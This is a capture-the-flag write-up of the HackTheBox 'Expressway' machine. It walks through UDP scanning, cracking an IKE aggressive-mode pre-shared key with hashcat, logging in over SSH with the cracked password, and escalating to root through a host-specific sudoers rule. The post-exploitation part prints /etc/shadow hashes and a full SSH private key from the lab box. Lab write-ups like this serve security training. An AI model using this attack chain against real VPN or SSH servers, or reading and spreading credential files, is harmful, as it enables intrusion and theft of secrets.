---
render_with_liquid: false
title: HackTheBox Writeup - Expressway
date: 2025-09-17 06:14 +1400
tags: [hackthebox, nmap, linux, ipsec, vpn, ike-scan, psk, hashcat, credentials-stuffing, discover-logs, sudo, sudoers, misconfiguration]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
    width: 640
    height: 480
---




# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ pt init '10.129.168.208'
╒════════════╤═════════════╤════════════════╤══════════╤════════════════╕
│ profile    │ lhost       │ rhost          │ domain   │ ip             │
╞════════════╪═════════════╪════════════════╪══════════╪════════════════╡
│ expressway │ 10.10.14.42 │ 10.129.168.208 │          │ 10.129.168.208 │
╘════════════╧═════════════╧════════════════╧══════════╧════════════════╛
```


## Nmap


### TCP

```bash
# Nmap 7.95 scan initiated Wed Sep 17 06:14:15 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22, 10.129.168.208
Nmap scan report for 10.129.168.208
Host is up, received user-set (0.19s latency).
Scanned at 2025-09-17 06:14:16 CST for 5s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 17 06:14:21 2025 -- 1 IP address (1 host up) scanned in 5.14 seconds
```


### UDP

```bash
[+] Running command: sudo nmap -sU -p- --min-rate 10000 --open -Pn -vv -oA ./nmap/all_udp_ports --open 10.129.168.208
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 06:14 CST
Initiating Parallel DNS resolution of 1 host. at 06:14
Completed Parallel DNS resolution of 1 host. at 06:14, 0.01s elapsed
Initiating UDP Scan at 06:14
Scanning 10.129.168.208 [65535 ports]
Increasing send delay for 10.129.168.208 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.129.168.208 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.129.168.208 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.129.168.208 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.129.168.208 from 400 to 800 due to max_successful_tryno increase to 8
Increasing send delay for 10.129.168.208 from 800 to 1000 due to max_successful_tryno increase to 9
Warning: 10.129.168.208 giving up on port because retransmission cap hit (10).
UDP Scan Timing: About 42.38% done; ETC: 06:15 (0:00:42 remaining)
Discovered open port 500/udp on 10.129.168.208
Completed UDP Scan at 06:15, 75.87s elapsed (65535 total ports)
Nmap scan report for 10.129.168.208
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-17 06:14:21 CST for 76s
Not shown: 65455 open|filtered udp ports (no-response), 79 closed udp ports (port-unreach)
PORT    STATE SERVICE REASON
500/udp open  isakmp  udp-response ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 75.98 seconds
           Raw packets sent: 721512 (34.851MB) | Rcvd: 86 (6.561KB)
```


## 500/UDP - IKE VPN

- `Auth=PSK` means that the vpn was configured using a pre-shared key
- Aggressive Mode is enabled
- Got a user :  `ike@expressway.htb` (`ID_USER_FQDN`)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ ike-scan -M -A $(pt get ip)
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.168.208  Aggressive Mode Handshake returned
        HDR=(CKY-R=e659a79a9185afbe)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.202 seconds (4.96 hosts/sec).  1 returned handshake; 0 returned notify
```


# User Flag
---

## Shell as ike


### 500 - IPsec : Crack PSK hash

> Google `500 udp ike attack` -> Methodology : https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp

Since Aggressive Mode is enabled, we can grab the **pre-shared key (PSK) hash**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ ike-scan -A --pskcrack 10.129.168.208 | tee pskcrack.log
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.168.208  Aggressive Mode Handshake returned HDR=(CKY-R=70279ffaefb1cc80) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
dfed0c4ae983ca2e71a1dc43674f3c327a52a318af010be64b68140a9e3520b3c85216dd0c89e0713954216db12f4d2682017bb592f65ef0d5c8c7bcdd9c186d35119b854cc372ce55504b279fe97458890f2368c2af931d27d5427b6c7c24cf2c5dcf012c4f5c4896a083ba409755c1ba334b70358f8ec300d966e274dd7990:91b941781b4f09b55fe4edb2b6077a42556ac2cd6f029471bc4348fbcc10deade68b8922c42b56f036250878e2294e9e00035a7dc9a381b9d439820ee3eb4dc5660101a8efed64b196e7783d8d0bd3af5593e88d1d4fe9d95acda7d60fc9b72d5c2b2f475099094085e99e4056bd3444b78eab9815fc9c3fde4e569c2bbbac4d:70279ffaefb1cc80:e24aff4d4a4c4228:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:0990a25b0bc8c3bab727a0de0c0577bfe4375fe2:88848486a16910ac37c1419d749ee31ac8fb0597e2ddbdb86867df27535c480c:c62558aad4c10e58b8155d0b3574f9761dc996bf
Ending ike-scan 1.9.6: 1 hosts scanned in 0.200 seconds (4.99 hosts/sec).  1 returned handshake; 0 returned notify
```

Extract and crack the hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ cat pskcrack.log | grep -P '^[A-Za-z0-9]{10,}' > pskcrack.hash

┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ hashcat pskcrack.hash /opt/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
[...]

┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ hashcat pskcrack.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

dfed0c4ae983ca2e71a1dc43674f3c327a52a318af010be64b68140a9e3520b3c85216dd0c89e0713954216db12f4d2682017bb592f65ef0d5c8c7bcdd9c186d35119b854cc372ce55504b279fe97458890f2368c2af931d27d5427b6c7c24cf2c5dcf012c4f5c4896a083ba409755c1ba334b70358f8ec300d966e274dd7990:91b941781b4f09b55fe4edb2b6077a42556ac2cd6f029471bc4348fbcc10deade68b8922c42b56f036250878e2294e9e00035a7dc9a381b9d439820ee3eb4dc5660101a8efed64b196e7783d8d0bd3af5593e88d1d4fe9d95acda7d60fc9b72d5c2b2f475099094085e99e4056bd3444b78eab9815fc9c3fde4e569c2bbbac4d:70279ffaefb1cc80:e24aff4d4a4c4228:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:0990a25b0bc8c3bab727a0de0c0577bfe4375fe2:88848486a16910ac37c1419d749ee31ac8fb0597e2ddbdb86867df27535c480c:c62558aad4c10e58b8155d0b3574f9761dc996bf:freakingrockstarontheroad
```


### 22 - SSH : Credential Stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Expressway]
└─$ sshpass -p 'freakingrockstarontheroad' ssh -o "StrictHostKeyChecking no" ike@10.129.168.208
Warning: Permanently added '10.129.168.208' (ED25519) to the list of known hosts.
Last login: Mon Sep 22 09:08:43 BST 2025 from 10.10.14.42 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 22 09:11:06 2025 from 10.10.14.42
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ cat user.txt
e5c972d111396827664b9264404a3c80
```


# Root Flag
---

## Shell as root


### Enumeration

Checked what the none-default group `proxy` owns, found **squid proxy** logs

```bash
ike@expressway:~$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group proxy -ls 2>/dev/null
    17693      4 drwxr-xr-x   2 proxy    proxy        4096 Sep 16 16:02 /var/spool/squid
    15362      0 -rw-r-----   1 proxy    proxy           0 May 16 01:24 /var/spool/squid/netdb.state
    17150      4 drwxr-xr-x   2 proxy    proxy        4096 Sep 16 16:02 /var/log/squid
    17151      4 -rw-r-----   1 proxy    proxy         941 Jul 23 01:47 /var/log/squid/cache.log.2.gz
    17195      4 -rw-r-----   1 proxy    proxy          20 Jul 22 19:32 /var/log/squid/access.log.2.gz
    17207      4 -rw-r-----   1 proxy    proxy        2192 Jul 23 01:47 /var/log/squid/cache.log.1
    17222      8 -rw-r-----   1 proxy    proxy        4778 Jul 23 01:19 /var/log/squid/access.log.1
```

```bash
ike@expressway:~$ zcat /var/log/squid/access.log.2.gz
```

Someone requested to access a vhost `offramp.expressway.htb` but got blocked

```bash
ike@expressway:~$ cat /var/log/squid/access.log.1
[...]
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
[...]
```


### SUDO - Vulnerable sudoers config

There's a custom **SUID** binary that owns by `root` at `/usr/local/bin/sudo`

```bash
ike@expressway:/var/log/squid$ find / -type f -perm -4000 -exec ls -lahtr {} + 2>/dev/null | awk '$9 !~ /^\/snap\//'
-rwsr-xr-x 1 root root        276K Jun 27  2023 /usr/bin/sudo
-rwsr-xr-- 1 root messagebus   51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        483K Aug 10 00:07 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        1.5M Aug 14 12:58 /usr/sbin/exim4
-rwsr-xr-x 1 root root        116K Aug 26 22:05 /usr/bin/passwd
-rwsr-xr-x 1 root root         87K Aug 26 22:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root         52K Aug 26 22:05 /usr/bin/chsh
-rwsr-xr-x 1 root root         70K Aug 26 22:05 /usr/bin/chfn
-r-sr-xr-x 1 root root         15K Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root         14K Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root       1023K Aug 29 15:18 /usr/local/bin/sudo
-rwsr-xr-x 1 root root         63K Sep  9 10:09 /usr/bin/umount
-rwsr-xr-x 1 root root         91K Sep  9 10:09 /usr/bin/su
-rwsr-xr-x 1 root root         19K Sep  9 10:09 /usr/bin/newgrp
-rwsr-xr-x 1 root root         75K Sep  9 10:09 /usr/bin/mount
```

It's a custom written binary, since we couldn't find any samples from the internet

```bash
ike@expressway:~$ file /usr/local/bin/sudo
/usr/local/bin/sudo: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6258d9474e8f194a0712672eec026d49e47710c2, for GNU/Linux 3.2.0, with debug_info, not stripped
ike@expressway:~$ md5sum /usr/local/bin/sudo
f5c6cf9746c318e6e55eef5a16c98605  /usr/local/bin/sudo
```

We can't run `sudo` on `expressway`

```bash
ike@expressway:/$ /usr/local/bin/sudo -l
Password:
Sorry, user ike may not run sudo on expressway.
```

But we can try to specify the host : `offramp.expressway.htb`

```bash
man sudo
```

![](/assets/obsidian/b9cb4b0529931eb6fcd949e7240fe1c4.png)

It worked due to security plugin config allows command execution on `offramp.expressway.htb`

```bash
ike@expressway:/$ sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

```bash
ike@expressway:/$ sudo -h offramp.expressway.htb bash
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:/# cat /root/root.txt
c8c85d98ac962de03625507ac39ac25b
```

From `sudoers` config, we can see that `ike` was configured to be able to run any commands as `root` on `offramp.expressway.htb`

```bash
root@expressway:/# cat /etc/sudoers
[...]

# Host alias specification
Host_Alias     SERVERS        = expressway.htb, offramp.expressway.htb
Host_Alias     PROD           = expressway.htb
ike            SERVERS, !PROD = NOPASSWD:ALL
ike         offramp.expressway.htb  = NOPASSWD:ALL
[...]
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@expressway:/home/ike# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$u0cgimzO/m87OQdCkETl10$mTZSmVXBn10OJT7qVqvlEr7OwC0QppltyX33WH1esn7:20229:0:99999:7:::
ike:$y$j9T$iACv1qBHXsR1j0yqIsVwY.$udBwggnZtUPt/0TNMIhsU4TDrQm2tCzTr6xUE0ilPQ4:20292:0:99999:7:::
```

```bash
[+] /home/ike/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
FtYlex5UmXQgwnbMZpqYl6zSs=
-----END OPENSSH PRIVATE KEY-----
```


### Files

```bash
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```